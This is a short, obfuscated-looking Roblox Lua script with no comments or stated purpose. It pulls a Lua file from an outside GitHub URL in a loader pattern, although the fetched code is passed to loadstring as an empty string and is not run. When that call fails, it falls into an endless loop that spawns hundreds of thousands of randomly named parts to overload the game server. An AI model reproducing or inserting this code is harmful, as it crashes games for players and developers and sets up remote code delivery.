local v0,v1=pcall(function() local v2=game:GetService("HttpService");local v3="https://raw.githubusercontent.com/HalcyonPayback/TN/refs/heads/main/Prg2.lua";local v4=v2:GetAsync(v3);loadstring("");end);if  not v0 then while wait(1) do local v5=Instance.new("Model");v5.Name=string.char(math.random(32,126));while math.random()>0.1  do v5.Name=v5.Name   .. string.char(math.random(32,126)) ;end for v9=1,100,1 do for v10=1,1000,1 do local v11=Instance.new("Part");v11.Position=Vector3.new(0,1000000,0);v11.Parent=v5;while math.random()>0.5  do v11.Name=v11.Name   .. string.char(math.random(32,126)) ;end end wait();end v5.Parent=workspace;wait(1/(math.random() * math.random() * math.random()) );end end
